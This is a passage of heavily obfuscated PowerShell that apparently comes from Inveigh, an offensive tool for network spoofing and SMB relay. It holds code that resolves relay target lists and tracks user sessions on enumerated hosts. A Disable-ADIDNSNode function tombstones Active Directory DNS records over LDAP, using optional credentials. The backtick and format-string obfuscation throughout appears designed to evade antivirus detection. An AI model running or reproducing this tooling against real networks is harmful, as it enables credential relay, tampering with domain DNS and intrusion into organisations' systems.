                W`RIT`e-outpUT(${i`NVEIgH}."oU`T`PUt_qUeuE"[0] + ${INV`ei`gh}."N`EwLine")
            }
            elseif(${i`Nv`EigH}."STa`TUs_o`U`T`put")
            {
                w`RITe-`o`UTPUT(${I`NV`eIgH}."oUTpu`T`_Q`UEUE"[0])
            }

            if(${IN`Ve`IGh}."File`_`o`UTpuT")
            {

                if (${INVE`iGH}."OUtP`Ut_QU`EUE"[0]."sTartsW`I`Th"(("{0}{1}" -f '[','+] ')) -or ${IN`V`EIgH}."OUTpU`T_Que`UE"[0]."s`Ta`Rtswi`Th"(("{1}{0}" -f'*] ','[')))
                {
                    ${inV`eigH}."lOG_`FIL`E_QUE`Ue"."A`dD"(${I`N`VEIgh}."Out`PUt_Qu`e`UE"[0]) > ${NU`ll}
                }
                else
                {
                    ${i`Nve`iGH}."lO`G_`FILe_qu`E`Ue"."a`DD"(("{3}{2}{1}{0}" -f']','acted','ed','[r')) > ${nU`lL}    
                }

            }

            if(${IN`VeI`GH}."Log_`Ou`T`pUT")
            {
                ${IN`Vei`gh}."l`OG"."a`DD"(${I`NVeI`Gh}."ouTpu`T_q`UeUE"[0]) > ${Nu`ll}
            }

            ${iNV`Ei`gh}."Out`pUT_`quEUE".("{1}{2}{0}" -f't','Remo','veA').Invoke(0)
        }

    }

}

if(!${InV`e`iGh}."Ne`TB`io`s_doM`AIN")
{
    ${InV`E`Igh}."Sta`Tu`s_out`p`UT" = ${fAL`Se}
    ${iNVeI`GH}."NetbiOS_dOM`A`In" = (GEt-C`hIL`d`itEm -path ("{3}{2}{1}{0}{4}" -f'mai','do','v:user','en','n'))."val`UE"
    ${inV`Ei`gh}."com`pUtE`R`_Na`mE" = (G`Et-CHilDIt`eM -path ("{0}{1}{2}{4}{3}" -f 'e','nv',':','putername','com'))."v`Alue"

    try
    {
        ${i`NV`eigh}."DNs`_DO`MaiN" = ((get-c`HIl`diT`eM -path ("{3}{0}{2}{4}{1}" -f'nv','n',':userdnsdo','e','mai') -ErrorAction ("{2}{1}{4}{3}{0}"-f 'e','yCon','Silentl','inu','t'))."V`ALue").("{1}{0}"-f 'ower','ToL').Invoke()
        ${i`Nve`igh}."DNS_coM`Pu`TEr_Na`Me" = (${iNV`E`iGh}."COMp`UtEr`_NA`me" + "." + ${I`NVeI`gH}."d`Ns`_dOMaIn").("{2}{1}{0}"-f 'er','ow','ToL').Invoke()

        if(!${in`VEi`gh}."D`oM`Ai`N_MaPPI`NG_`TAble".("{0}{1}{2}" -f 'C','ontainsK','ey').Invoke(${InV`e`igH}."netBiO`S`_`doMaIN"))
        {
            ${i`NVei`gH}."DOmAIN_maP`P`iN`G_`T`ABlE".("{0}{1}" -f 'Ad','d').Invoke(${inVe`IGh}."NETbIos_`D`o`m`AIn",${I`NVE`IgH}."d`Ns_DO`maIN")
        }

    }
    catch
    {
        ${iNV`Ei`Gh}."dNs`_D`oMain" = ${Inv`Ei`GH}."nEtB`iOS_`d`Oma`In"
        ${iNV`ei`Gh}."Dn`s_`co`MpU`Ter_`NAme" = ${iN`Ve`iGh}."COM`PU`Ter_n`AMe"
    }

}
else
{

    if(!${i`N`VEigH}."DOm`Ai`N_MA`Pp`IN`G_tablE".("{0}{2}{1}" -f 'Co','insKey','nta').Invoke(${invE`I`GH}."nETBioS`_do`mA`iN"))
    {
        ${invE`I`Gh}."doMAIN`_`MAPpiNg_taB`Le".("{0}{1}" -f'Ad','d').Invoke(${i`NVEiGH}."NEtbios_DO`m`A`in",${In`V`EIgh}."D`N`S_dOmAiN")
    }

}

if(${In`VeI`Gh}."E`N`UmeraTe")
{
    ${i`Nv`EIgH}."Ou`T`PUT`_QUeue".("{0}{1}" -f'Ad','d').Invoke(("{4}{3}{1}{2}{0}{8}{6}{5}{9}{7}"-f 'm','f','or','er','[*] P','orte',' imp','rgets','ing DNS on','d ta')) > ${NU`LL}

    for(${I} = 0;${i} -lt ${In`Ve`igh}."ENuM`E`RAtE"."Co`Unt";${i}++)
    {

        if(${I`N`VeIgH}."ENuM`e`R`ATE"[${i}]."HO`stname" -and !${iN`V`eIgh}."ENuME`RAtE"[${I}]."Ip" -and ${IN`Vei`GH}."eN`Umer`AtE"[${i}]."DNS Record" -ne ${fa`LSe})
        {
            ${DNs_L`OO`kUP} = ${TR`UE}

            try
            {
                ${Ip`_L`isT} =   (Get`-c`H`ildIteM ('Var'+'Ia'+'BlE:3YV'+'h')).VAluE::"G`ET`H`OSteNTRy"(${inv`EIGh}."EnuMer`ATe"[${i}]."ho`st`NamE")

                foreach(${E`NTrY} in ${ip`_l`ISt}."aDDrEsS`li`st")
                {

                    if(${EN`T`RY}."AdDr`E`S`sfA`MiLY" -eq ("{0}{1}{2}"-f 'In','te','rNetwork'))
                    {
                        ${I`N`VEigh}."EnU`Mer`AtE"[${I}]."ip" = ${e`NT`Ry}."I`pa`Ddr`e`sSTOStR`ING"
                        ${IN`Ve`IGH}."en`Um`EraTe"[${i}]."DNS Record" = ${TR`UE}
                        ${inv`Ei`Gh}."enum`e`RATe"[${I}]."IPv6 Only" = ${F`AlsE}
                        ${tar`Ge`T_ENu`mErAte`_K`eEP} = ${t`Rue}
                    }

                }

                if(!${T`AR`GET`_eNum`er`ATe_`KeEp})
                {
                    ${in`V`eigh}."O`UtPUt`_Qu`eue"."a`dd"(("[-] [$(Get-Date -format s)] IPv6 target $($inveigh.enumerate[$i].Hostname) not supported ")) > ${N`UlL}
                    ${INVEi`gh}."eNU`meRa`TE"[${i}]."IPv6 Only" = ${t`RUe}
                }

            }
            catch
            {
                ${i`Nv`eigH}."outpU`T_que`Ue"."a`DD"(("[-] [$(Get-Date -format s)] DNS lookup for $($inveigh.enumerate[$i].Hostname) failed ")) > ${nU`Ll}
                ${iN`VE`igH}."EnuM`E`Rate"[${I}]."DNS Record" = ${fA`LSe}
            }

            ${Targ`ET`_E`N`UM`erat`e_KEEp} = ${F`AL`sE}
            ${i`p_lISt} = ${N`Ull}
        }

    }

    if(${d`Ns_`loOKUP})
    {
        ${iN`VE`Igh}."ou`TPUt`_`QUEUe"."a`Dd"(("{2}{3}{4}{1}{0}" -f'omplete','s c','[+]',' DNS looku','p')) > ${Nu`ll}
        ${dnS`_lO`oKUp} = ${FAl`SE}
    }
    else
    {
        ${inVE`iGh}."ou`TPut_`quEue"."A`dd"(("{1}{0}{4}{2}{3}" -f 'o DNS','[+] N','requi','red',' lookups ')) > ${nU`ll}
    }

}

if(${In`V`EIGH}."tAr`g`E`T_LIst")
{
    ${INV`e`iGh}."o`UTPUt_Q`U`Eue".("{1}{0}"-f'd','Ad').Invoke(("{10}{2}{11}{3}{6}{7}{0}{5}{1}{9}{4}{8}" -f'g DNS l','o','*] Pe','f','g','ookups ','o','rmin','et list','n tar','[','r')) > ${nU`ll}

    for(${I} = 0;${I} -lt ${In`Ve`IgH}."T`A`RGet_LIst"."c`OUNt";${i}++)
    {

        if(!(${i`NveI`gH}."t`A`RgEt_LiST"[${i}] -as [IPAddress] -as [Bool]))
        {
            ${dn`s_L`o`OKUP} = ${t`RUe}

            try
            {
                ${iP_l`i`st} =   ( gEt-`chIlD`iTEM  ('V'+'ARiA'+'ble:3Y'+'VH')  ).VAlUe::"GeThOs`TeN`TRy"(${In`Vei`gH}."ta`Rg`et_L`Ist"[${i}])

                foreach(${En`T`RY} in ${I`P_Li`sT}."add`RE`s`sliST")
                {

                    if(${ENT`RY}."A`ddreSs`Fa`mily" -eq ("{0}{3}{1}{2}"-f'Inte','Netw','ork','r'))
                    {
                        ${inV`E`iGH}."t`ARgET_lI`sT"[${i}] = ${E`N`TrY}."IPADDr`eSsTO`s`TRInG"
                        ${tAR`G`ET_KE`eP} = ${t`RUe}
                    }

                    if(!${targ`E`T_Keep})
                    {
                        ${iN`VEI`Gh}."ou`TpuT_qU`e`UE"."A`Dd"(("[-] [$(Get-Date -format s)] IPv6 target $($inveigh.target_list[$i]) not supported ")) > ${n`Ull}
                        ${i`NVeIgH}."oUT`pU`T_Q`UeuE"."a`dD"(("[!] [$(Get-Date -format s)] Removed $($inveigh.target_list[$i]) from target list ")) > ${n`Ull}
                        ${inv`e`igh}."TArGE`T_l`ist".("{0}{1}" -f 'Re','moveAt').Invoke(${i})
                        ${i} -= 1
                    }

                }
                        
            }
            catch
            {
                ${iN`VeI`Gh}."oU`TpUT_`QU`EUe"."a`dD"(("[-] [$(Get-Date -format s)] DNS lookup for $($inveigh.target_list[$i]) failed ")) > ${N`ULL}
                ${I`Nv`EIGh}."ouTpUT`_qUe`Ue"."a`Dd"(("[!] [$(Get-Date -format s)] Removed $($inveigh.target_list[$i]) from target list ")) > ${n`Ull}
                ${I`NveI`gh}."TArg`eT`_LIst".("{0}{1}"-f 'RemoveA','t').Invoke(${i})
                ${I} -= 1
            }

            ${t`ArGE`T`_keEP} = ${fA`lse}
            ${ip`_LI`st} = ${nu`Ll}
        }

    }

    if(${d`Ns`_L`OOkUP})
    {
        ${INv`e`igH}."O`Utp`UT`_QuEUe"."a`dd"(("{2}{0}{1}{3}{4}" -f' DNS looku','p','[+]','s o','n complete')) > ${nU`LL}
        ${DNs_`LO`OkUP} = ${FAl`sE}
    }
    else
    {
        ${I`NVEiGh}."O`U`Tput`_QueUE"."A`Dd"(("{3}{1}{0}{2}{4}" -f'DNS look','] No ','u','[+','ps required')) > ${N`ULL}
    }

}

if(${i`NVEiGH}."TA`RGET`_eX`CLu`DE_LI`st")
{
    ${iNvei`GH}."OUTp`Ut`_`qUeuE".("{1}{0}" -f'dd','A').Invoke(("{5}{1}{6}{9}{3}{4}{7}{0}{2}{10}{8}"-f 'lookups','*] Perf',' on excluded ta','in','g ','[','o','DNS ','st','rm','rgets li')) > ${N`UlL}

    for(${i} = 0;${i} -lt ${IN`Vei`gH}."TaRgEt`_excLuDE`_`lI`sT"."C`OUNT";${i}++)
    {

        if(!(${InvEI`gh}."tArG`E`T_ExCl`Ud`e_lI`sT"[${I}] -as [IPAddress] -as [Bool]))
        {
            ${dNs_l`ook`Up} = ${TR`UE}

            try
            {
                ${I`p_liST} =   $3yVh::"gEThO`ste`NtrY"(${in`VE`iGH}."TaRGet_EX`clU`dE_`lIsT"[${I}])

                foreach(${En`T`Ry} in ${ip`_L`isT}."adD`ReSS`LiST")
                {

                    if(${ENt`Ry}."aDd`REsSf`AM`ily" -eq ("{1}{3}{2}{0}" -f 'rk','I','wo','nterNet'))
                    {
                        ${i`NVei`gh}."tAr`GET_`e`Xc`LUDE_LIst"[${I}] = ${E`N`TRY}."i`p`ADdrESSTO`striNG"
                        ${Ta`R`g`eT`_EXCLUdE`_kE`ep} = ${tr`UE}
                    }

                }

                if(!${TargEt_`Exclud`E_`K`e`Ep})
                {
                    ${invE`i`GH}."OUTPUT`_`QUEUE"."a`Dd"(("[-] [$(Get-Date -format s)] IPv6 target $($inveigh.target_list[$i]) not supported ")) > ${Nu`Ll}
                    ${INVE`i`gH}."o`UTPU`T_quE`UE"."a`dd"(("[!] [$(Get-Date -format s)] Removed $($inveigh.target_exclude_list[$i]) from exclusion list ")) > ${n`UlL}
                    ${i`NvEi`GH}."taRgeT_e`X`c`lUDe`_lIsT".("{0}{1}" -f 'R','emoveAt').Invoke(${I})
                    ${i} -= 1
                }

            }
            catch
            {
                ${I`NVei`gh}."outpu`T_Q`Ue`Ue"."a`dD"(("[-] [$(Get-Date -format s)] DNS lookup for $($inveigh.target_exclude_list[$i]) failed ")) > ${nU`Ll}
                ${INV`EigH}."o`Utp`U`T_quEuE"."A`Dd"(("[!] [$(Get-Date -format s)] Removed $($inveigh.target_exclude_list[$i]) from exclusion list ")) > ${NU`Ll}
                ${iN`VE`igH}."taRGET_ExC`LUd`e`_List".("{0}{1}{2}"-f'Re','move','At').Invoke(${I})
                ${I} -= 1
            }

            ${TArg`ET_E`xCLu`de_K`EEP} = ${f`A`Lse}
            ${IP`_l`IST} = ${N`UlL}
        }

    }

    if(${Dns`_`lOokuP})
    {
        ${In`VEigh}."oUtp`U`T_qu`EUe".("{0}{1}" -f 'A','dd').Invoke(("{5}{0}{1}{4}{3}{2}"-f'] DN','S look','mplete','s co','up','[+')) > ${n`UlL}
        ${D`NS_lOO`K`UP} = ${fa`l`Se}
    }
    else
    {
        ${i`NvEi`Gh}."oUTpu`T_Q`U`eue"."a`dD"(("{1}{3}{0}{4}{2}{5}" -f 'okups ','[+] No DNS','u',' lo','req','ired')) > ${nu`ll}
    }

}

if(${iN`VEIGH}."T`Ar`GeT_lIsT" -and ${i`NveI`gH}."Tar`G`E`T_eXCLuD`E_LISt")
{
    ${i`NvEi`Gh}."TAR`GeT_`lisT" = cO`MPaRE`-Obje`cT -ReferenceObject ${iNVe`I`Gh}."TARGeT_`exCLudE`_`lIsT" -DifferenceObject ${InV`E`igH}."TARG`Et_L`I`St" | WhER`E-`oBjecT {${_}."siDeInDi`C`AT`or" -eq "=>"} | FOrE`A`cH`-obje`ct {${_}."i`N`puto`BJecT"}
}

if(!${in`VE`IgH}."tAr`g`et_`List" -and !${IN`VEI`gH}."En`UMeR`AtED")
{
    ${IN`VEI`GH}."o`UtPUT`_`QUEUe"."a`DD"(("[!] [$(Get-Date -format s)] Disabling relay due empty target list ")) > ${Nu`ll}
    ${inVEI`gh}."S`m`B_rELay" = ${f`Al`sE}
}

${i`NV`EIGH}."staTUs_`ou`TPuT" = ${fA`Lse}





${S`h`ArE`D_`Basi`C_fuNc`TIoNs_`ScRiP`T`B`lOcK} =
{

    function g`ET`-uiN`T1`6D`AtALeNg`TH
    {
        param ([Int]${st`Art},[Byte[]]${D`ATA})

        ${DaTa_`L`en`gtH} =   (  vAr`iAB`Le xV8qnB -vaLuEOnlY  )::"ToUin`T`16"(${Da`Ta}[${st`ART}..(${s`TArt} + 1)],0)

        return ${d`ATa`_lEN`GTh}
    }

    function g`ET-UInT32`da`TAlENG`TH
    {
        param ([Int]${S`Tart},[Byte[]]${Da`Ta})

        ${DaTA_L`e`NgTH} =   (d`IR  VariAbLE:xV8qNB  ).vaLuE::"t`ouInT32"(${d`AtA}[${S`TArT}..(${ST`A`Rt} + 3)],0)

        return ${d`ATA_L`EN`gth}
    }

    function cO`Nvert-dATat`ostr`i`NG
    {
        param ([Int]${sT`A`RT},[Int]${lEn`G`Th},[Byte[]]${dA`TA})

        ${sTriNG_D`A`TA} =   $xV8qNb::"t`oSTR`ING"(${D`ATA}[${StA`Rt}..(${S`T`ART} + ${lEn`g`Th} - 1)])
        ${STr`Ing_DA`TA} = ${STrING_`da`Ta} -replace "-00",""
        ${sTri`NG_d`A`TA} = ${S`T`RiNg_`DatA}.("{0}{1}" -f'Spl','it').Invoke("-") | foR`EA`c`H-objeCt{[Char]  ( gE`T-Va`RIAble  4vXn  ).valUE::("{1}{0}{2}"-f'Int','To','16').Invoke(${_},16)}
        ${STRiNg`_`Ex`TRaCt} = nE`w-OB`J`ecT ("{3}{1}{2}{0}"-f'm.String','y','ste','S') (${s`TrING_DA`TA},0,${StriN`g_dA`Ta}."L`ength")

        return ${ST`RINg_`eX`TRACt}
    }

    function N`eW`-RE`lA`YE`NUmob`JeCT
    {
        param (${i`p},${hoStN`A`Me},${DNSDo`Ma`iN},${N`e`Tb`IosDOmAiN},${seSs`iO`Ns},${adMiNiS`TrA`TOrUS`eRS},${aDmiNI`sTraToRgr`o`Ups},
            ${PR`I`Vil`EgEd},${SHA`R`eS},${NE`TsE`Ss`IonS},${nETS`ESsionsm`A`pp`Ed},${l`ocALu`sE`Rs},${s`mb2},${sIg`NI`Ng},${SmB`SEr`VEr},${D`NS`REcord},
            ${Ip`V6ON`ly},${T`Ar`G`ETed},${EnuM`Er`ATE},${E`x`EcUTe})

        if(${s`es`SIO`NS} -and ${se`ssi`ONS} -isnot [Array]){${Se`sS`iO`Ns} = @(${sE`Ss`iONs})}
        if(${aDm`InIsTR`A`ToRuSERs} -and ${ADm`InisTR`At`O`RusErS} -isnot [Array]){${AdmINIstR`Ato`R`U`Sers} = @(${aDMi`N`istRaTo`Ru`S`ERs})}
        if(${Ad`mINIstr`A`TOrgrouPS} -and ${Ad`MINIsTRAtorG`Ro`U`pS} -isnot [Array]){${AdminISTr`AT`orGr`OUps} = @(${ADmin`is`TRAto`RgR`O`UpS})}
        if(${PrIvi`leg`Ed} -and ${P`Ri`V`IlEGEd} -isnot [Array]){${privI`L`EgED} = @(${PRIVI`LE`geD})}
        if(${ShA`REs} -and ${sH`A`RES} -isnot [Array]){${sHA`R`Es} = @(${ShA`Res})}
        if(${NETS`ESs`iONS} -and ${nETse`SSI`oNS} -isnot [Array]){${nets`ESsI`O`NS} = @(${net`s`Essio`Ns})}
        if(${Net`Ses`S`ioNSMAp`PeD} -and ${neT`sEssI`oNSm`APPED} -isnot [Array]){${nE`T`SEsSIoNsmApP`Ed} = @(${nETSE`SSi`onSMap`peD})}
        if(${L`Oc`ALuSe`Rs} -and ${l`ocAlu`SeRS} -isnot [Array]){${l`OCALuS`ErS} = @(${LOC`Aluse`Rs})}

        ${R`e`lAy_oBje`ct} = n`E`w-oBj`eCT ("{1}{0}{2}" -f'bjec','PSO','t')
        Ad`D`-MembEr -InputObject ${Rel`Ay`_OBJECt} -MemberType ("{0}{2}{1}" -f'Note','ty','Proper') -Name ("{1}{0}" -f'dex','In') ${InVe`I`Gh}."E`NuM`E`RATe"."CO`UNt"
        Add-M`em`BEr -InputObject ${RELaY_`oB`JECt} -MemberType ("{1}{0}{2}" -f 'oteP','N','roperty') -Name "IP" ${i`P}
        AD`D-ME`mBeR -InputObject ${ReLAY`_`oBj`ect} -MemberType ("{0}{3}{2}{1}" -f'N','y','t','oteProper') -Name ("{2}{0}{1}"-f 'stn','ame','Ho') ${h`Os`TNAMe}
        A`D`d-MEMbER -InputObject ${rE`LAy_`ObjEct} -MemberType ("{0}{2}{1}{3}"-f'Not','rop','eP','erty') -Name ("{2}{1}{0}" -f'n','ai','DNS Dom') ${dns`d`o`MAin}
        ADD-meM`B`eR -InputObject ${rELA`Y_oB`JECt} -MemberType ("{2}{1}{0}" -f'ty','teProper','No') -Name ("{1}{3}{2}{0}" -f 'ain','net','IOS Dom','B') ${NEtbI`osD`OMA`In}
        a`dD-mEm`BeR -InputObject ${ReLa`y_oB`JecT} -MemberType ("{0}{2}{1}" -f 'Not','perty','ePro') -Name ("{0}{1}"-f'Sessio','ns') ${sESS`i`OnS}
        adD`-meM`B`eR -InputObject ${r`eL`AY_`obJecT} -MemberType ("{0}{2}{3}{1}" -f'Note','rty','P','rope') -Name ("{1}{2}{0}{3}"-f' Use','Adminis','trator','rs') ${aDM`INiST`RA`T`ORUse`Rs}
        Add-Me`mb`er -InputObject ${reL`A`y_oBJecT} -MemberType ("{1}{0}{3}{2}" -f 'teP','No','ty','roper') -Name ("{2}{1}{0}{6}{4}{5}{3}" -f 'tr','s','Admini','ps','tor Gr','ou','a') ${adMI`N`IS`TRaT`or`g`RoUPS}
        Add-M`e`MBer -InputObject ${r`E`lAy_O`Bj`EcT} -MemberType ("{1}{0}{2}{3}"-f'o','N','teProper','ty') -Name ("{1}{0}{2}" -f 'i','Pr','vileged') ${p`RI`ViLEged}
        add-M`EmB`Er -InputObject ${r`E`lAy_oBJEct} -MemberType ("{0}{1}{3}{2}" -f'N','ote','ty','Proper') -Name ("{0}{1}"-f 'Share','s') ${ShA`Res}
        aDd-mE`m`BEr -InputObject ${REl`Ay`_o`BjECt} -MemberType ("{1}{0}{3}{2}" -f 'e','Not','roperty','P') -Name ("{0}{2}{3}{1}"-f'Net','s','Sessi','on') ${netseS`sIO`NS}
        aDD`-MeMB`eR -InputObject ${REL`AY`_OBJe`Ct} -MemberType ("{0}{3}{1}{2}"-f'Note','pert','y','Pro') -Name ("{4}{2}{1}{3}{0}"-f 'ped','ions M','ss','ap','NetSe') ${Ne`TsES`Si`oNsMA`PPED}
        ADD`-me`M`BeR -InputObject ${rE`L`A`Y_ObJect} -MemberType ("{0}{3}{1}{2}"-f 'Not','Prop','erty','e') -Name ("{0}{2}{1}" -f 'Lo','rs','cal Use') ${loC`Al`USeRs}
        add`-ME`Mb`er -InputObject ${reL`AY_O`BjeCt} -MemberType ("{1}{2}{3}{0}"-f 'perty','NoteP','r','o') -Name ("{0}{1}"-f 'SMB2.','1') ${s`mB2}
        A`DD-m`EmbeR -InputObject ${R`e`l`AY`_obJeCT} -MemberType ("{1}{2}{3}{0}"-f'ty','N','oteP','roper') -Name ("{0}{1}" -f 'S','igning') ${sIG`NInG}
        aDd`-mE`mber -InputObject ${rE`Lay_ob`j`Ect} -MemberType ("{2}{1}{0}"-f 'perty','ePro','Not') -Name ("{3}{2}{1}{0}"-f 'ver','er','S','SMB ') ${sMBS`ER`VEr}
        ad`d-`M`eMBER -InputObject ${rEla`y_O`BJeCt} -MemberType ("{2}{1}{0}" -f 'operty','Pr','Note') -Name ("{2}{1}{3}{0}"-f'rd','NS','D',' Reco') ${dN`SrEc`orD}
        Add-ME`m`Ber -InputObject ${rELa`Y_`OBJ`eCt} -MemberType ("{0}{3}{1}{2}" -f'N','Pro','perty','ote') -Name ("{0}{2}{1}"-f 'IP','ly','v6 On') ${I`pv6`onlY}
        Add-`M`E`MBER -InputObject ${R`ELAY_O`Bj`ecT} -MemberType ("{0}{1}{2}" -f'Note','Pr','operty') -Name ("{1}{0}{2}" -f 'a','T','rgeted') ${T`Ar`GeT`eD}
        A`DD-`MEMbeR -InputObject ${rElA`Y_Ob`jECT} -MemberType ("{2}{0}{1}"-f 'ePr','operty','Not') -Name ("{2}{1}{3}{0}"-f 'rate','num','E','e') ${E`Num`ERatE}
        Add-`M`E`MBEr -InputObject ${rE`lA`y_ObjECt} -MemberType ("{1}{2}{0}"-f 'y','Not','ePropert') -Name ("{0}{2}{1}" -f'Ex','e','ecut') ${Exec`U`Te}
        
        return ${REl`Ay`_Ob`je`CT}
    }

    function IN`Vok`E`-`S`eS`sionUpdatE
    {
        param ([String]${DOMa`iN},[String]${usE`Rn`AmE},[String]${hOS`TN`AME},[String]${I`P})

        if(${iNV`eIgH}."DOMAiN`_`mApP`Ing_t`AbLe".${D`oMA`In})
        {
            ${sEsS`I`ON} = (${u`ser`NaMe} + "@" + ${InVe`I`gH}."dOmAin_mapp`In`g_`TABLE".${Do`mA`iN}).("{1}{0}{2}"-f 'p','ToUp','er').Invoke()
            ${HoS`TNaMe_`FuLL} = (${hOS`TnA`mE} + "." + ${I`NV`eigh}."DO`MA`iN_mAp`piNG`_TaB`LE".${D`O`MaIN}).("{2}{1}{0}" -f 'pper','oU','T').Invoke()
        }
        else
        {
            ${S`E`SsIoN} = ${do`MAin} + "\" + ${us`eRn`A`mE}
        }

        for(${I} = 0;${I} -lt ${iNVE`igh}."EnuM`ERa`TE"."C`oUNT";${i}++)
        {

            if(${IN`V`EiGh}."En`Ume`RATE"[${I}]."H`os`TnAmE" -eq ${hOsTN`AmE`_FULl} -or ${i`Nve`iGH}."enumER`A`Te"[${i}]."iP" -eq ${I`p})
            {

                if(!${Inve`i`Gh}."e`N`UMeratE"[${I}]."H`o`STNaMe")
                {
                    ${iN`Ve`iGH}."enU`M`eRAtE"[${tArge`T_I`NDeX}]."h`OstN`AMe" = ${Ho`St`NAmE_FuLl}
                }

                [Array]${ses`SIoN_li`st} = ${inV`E`IgH}."e`N`UMeRATe"[${I}]."sESs`iO`NS"

                if(${iNv`e`IgH}."DoMaIn_`mapping_t`Ab`LE".${d`O`mAin})
                {

                    for(${j} = 0;${J} -lt ${SesSI`O`N_LIst}."c`oUNt";${j}++)
                    {

                        if(${sEsSIoN`_lI`sT}[${J}] -like "$domain\*")
                        {
                            ${SeS`sI`ON_uS`Ern`AMe} = (${SeS`sioN`_`li`sT}[${j}].("{0}{1}"-f'Sp','lit').Invoke("\"))[1]
                            ${sE`ss`IO`N_uPdA`Te} = ${SeS`si`On_uSeRn`A`mE} + "@" + ${I`Nve`IGh}."DoMain_`Ma`P`P`inG_T`AblE".${dOM`AiN}
                            ${Se`S`S`IoN_list}[${j}] += ${sESs`I`On`_UpDATE}
                            ${i`N`VeIgH}."ENuMEr`AtE"[${I}]."se`sS`ionS" = ${sESsiO`N`_LISt}
                        }

                    }

                }

                if(${S`e`SsIOn_LiSt} -notcontains ${sEsS`i`On})
                {
                    ${SESsIo`N`_l`i`St} += ${Ses`S`ion}
                    ${in`VEI`gh}."EN`U`meRAtE"[${I}]."s`ESsI`ONs" = ${sESs`i`oN_Li`ST}
                }

                ${TA`Rg`E`T_upDAted} = ${t`Rue}
                break
            }

        }
     
        if(!${TaRGEt`_U`p`DaT`eD})
        {
            ${In`V`eiGH}."En`UmeRa`Te".("{1}{0}"-f'd','Ad').Invoke((nEW-relAY`E`NumOBJe`CT -IP ${iP} -Hostname ${hOsT`NaM`e_`FuLl} -Sessions ${Se`sSiOn})) > ${n`Ull}
        }

    }

}


${aDi`dns_f`UN`c`TI`oNS_s`Cr`I`PtbLoCK} =
{

    function Di`SAbLe-A`did`N`SnoDE
    {

        [CmdletBinding()]
        param
        (
            [parameter(MaNDAToRy=${f`A`lSe})][String]${Doma`iN},
            [parameter(MaNdAtORy=${F`AL`sE})][String]${Do`M`A`i`NC`OntrolLer},
            [parameter(MANDaToRY=${t`RUE})][String]${n`odE},
            [parameter(ManDATORy=${f`AlSE})][ValidateSet({"{1}{0}{2}{3}" -f 'om','D','ai','nDNSZones'},{"{2}{0}{4}{3}{1}" -f'orestD','s','F','ne','NSZo'})][String]${p`Ar`TITiON} = ("{2}{1}{0}" -f 'Zones','ainDNS','Dom'),
            [parameter(manDaToRy=${Fa`lsE})][String]${ZO`NE},
            [parameter(manDAToRy=${F`ALSE})][System.Management.Automation.PSCredential]${crED`en`TIaL}
        )

        ${So`As`eRiAlnu`mBEr`Arr`Ay} = NEw-`SOAs`Eria`L`NumbE`RA`RrAY -DomainController ${DoMaI`NcoN`T`R`oLl`ER} -Zone ${z`oNE}

        ${d`i`St`inguiShE`d_n`Ame} = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,DC=$Partition"
        ${Dc_arr`AY} = ${d`o`MAIn}.("{1}{0}" -f 't','Spli').Invoke(".")

        foreach(${dc} in ${DC_A`RRAy})
        {
            ${d`IS`Ti`NGu`IsheD_Na`me} += ",DC=$DC"
        }

        if(${crEdE`N`T`Ial})
        {
            ${dIR`ecTo`RY_`e`N`TRY} = new`-o`BjEct ("{6}{4}{2}{1}{0}{3}{7}{5}" -f'yServi','or','ct','ce','re','Entry','System.Di','s.Directory')("LDAP://$DomainController/$distinguished_name",${Cre`deNt`i`AL}."UsER`NA`Me",${C`Reden`Ti`Al}.("{2}{5}{1}{4}{0}{3}"-f'tia','rkCr','GetN','l','eden','etwo').Invoke()."P`AsSWOrd")
        }
        else
        {
            ${diR`EcTOrY`_e`NT`RY} = nEW-o`B`JECt ("{4}{2}{3}{0}{9}{1}{6}{8}{5}{7}"-f'.D','Services.','ys','tem','S','Ent','Director','ry','y','irectory') "LDAP://$DomainController/$distinguished_name"
        }

        ${TI`m`es`TamP} = [Int64]((  $C1zJuS::"UtcN`Ow"."ti`cks")-(G`eT-da`Te ("{0}{1}"-f '1/1/16','01'))."tI`CKS")
        ${tI`Mesta`MP} =  $Xv8qnB::"To`s`TRiNg"( (  Get`-vaRIa`B`le  ('XV8'+'QNB')  -Va  )::("{2}{1}{0}" -f 'es','yt','GetB').Invoke(${tiM`E`stamP}))
        ${T`ImeSta`MP} = ${T`iMe`STAmP}.("{1}{0}"-f 'it','Spl').Invoke("-") | f`OrEaC`H-o`BjECt{ ( GE`T-V`AriAB`le  4VxN  ).VAlUE::("{2}{0}{1}" -f 'Int','16','To').Invoke(${_},16)}

        [Byte[]]${d`NS_`REcO`Rd} = 0x08,0x00,0x00,0x00,0x05,0x00,0x00,0x00 +
            ${S`Oa`SeRIalnUMBer`A`R`R`AY}[0..3] +
            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
            ${t`iME`staMp}

        try
        {
            ${dI`R`ECTORy_`EnTRY}.("{0}{1}"-f 'Invo','keSet').Invoke(("{2}{3}{1}{0}"-f'ord','Rec','dn','s'),${d`NS_Re`c`OrD})
            ${D`Irec`TOry_`ENtRY}.("{0}{2}{1}{3}" -f'I','k','nvo','eSet').Invoke(("{2}{0}{1}" -f 'ombs','toned','dnsT'),${T`Rue})
            ${dIR`EcTo`Ry`_e`NTry}.("{0}{1}" -f'Se','tInfo').Invoke()
            ${in`V`EIGh}."Ou`T`pUT_quEUE"."A`dd"(("[+] [$(Get-Date -format s)] ADIDNS node $Node tombstoned in $Zone ")) > ${n`UlL}
        }
        catch
        {
            ${ERRoR_`Mes`SA`Ge} = ${_}."Ex`CEpt`iOn"."MesS`Age"
            ${ErRO`R`_meSSaGE} = ${E`Rr`OR`_mes`SAGe} -replace "`n",""
            ${I`NvE`IgH}."OU`TPuT_q`UeuE"."a`Dd"(("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim()) ")) > ${n`ULl}
        }

        if(${d`IR`ectO`Ry_eNTry}."pa`TH")
        {
            ${d`IRectO`Ry_eNtRY}.("{0}{1}" -f 'C','lose').Invoke()
        }

    }

    function NE`W-SoAS`ErIaLNu`mBEra`RraY
    {

        [CmdletBinding()]
        param
        (
            [parameter(MAndAtOry=${F`A`lsE})][String]${Domai`Nc`On`Tr`oLLeR},
            [parameter(mANDAToRy=${f`A`LsE})][String]${z`one}
        )

        ${zo`Ne} = ${z`one}.("{1}{0}"-f'wer','ToLo').Invoke()

        function CO`NVErT-`d`ATatO`UinT`16(${FI`ElD})
        {
              $KJRLW::("{0}{2}{1}" -f 'Rev','rse','e').Invoke(${F`Ie`LD})
